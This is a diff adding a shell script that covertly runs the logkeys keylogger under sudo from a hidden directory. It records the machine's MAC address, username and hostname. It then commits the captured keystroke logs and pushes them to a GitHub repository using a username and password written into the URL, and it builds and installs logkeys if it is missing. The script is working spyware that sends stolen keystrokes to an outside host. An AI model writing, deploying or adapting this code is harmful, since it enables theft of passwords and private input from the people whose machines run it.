@@ -1,0 +1,59 @@
+#!/bin/sh
+
+MDIR=$HOME/.data_servicex
+SDIR=$MDIR/setup
+LDIR=$MDIR/log
+TDIR=$MDIR/tmp
+
+RDIR=run/
+LBIN=bin/
+GBIN=/usr/local/bin/
+
+LMDIR=$LDIR/$(date '+%Y-%m')
+
+sudo logkeys --kill
+
+if [ -d $LMDIR ]  
+then
+     echo "$LMDIR exists"
+     cd $LMDIR
+     sudo encriptFile
+     git add --all
+     git commit -m "root-$(date +"%D %T")"
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     cd $HOME 
+else
+     echo "$LMDIR doesn't exists"
+     mkdir $LMDIR
+     cd $LMDIR
+     read MAC </sys/class/net/eth0/address
+     echo "started $MAC $USER $HOSTNAME $(date +"%D %T")" >  $(date '+%y_%m_%d_%I_%M_%S').txt 
+     sudo encriptFile
+     git add --all
+     git commit -m "root-$(date +"%D %T")"
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     cd $HOME
+fi
+
+sudo logkeys --start --keymap=$SDIR/map/1q2w.map --output=$LMDIR/$(date '+%y_%m_%d_%I_%M_%S').txt 
+ret=$?
+if [ $ret -ne 0 ]; then
+     mkdir $TDIR
+     cd $TDIR
+     sudo apt-get install -y automake
+     git clone https://github.com/kernc/logkeys.git
+     cd logkeys
+     ./autogen.sh
+     cd build
+     ../configure
+     make
+     sudo make install
+     cd $HOME
+     rm -rf $TDIR
+     sudo logkeys --start --keymap=$SDIR/map/1q2w.map --output=$LMDIR/$(date '+%y_%m_%d_%I_%M_%S').txt 
+     echo "log started successfully!1!"
+else
+     echo "log started successfully!!!"
+fi
+
+#Done
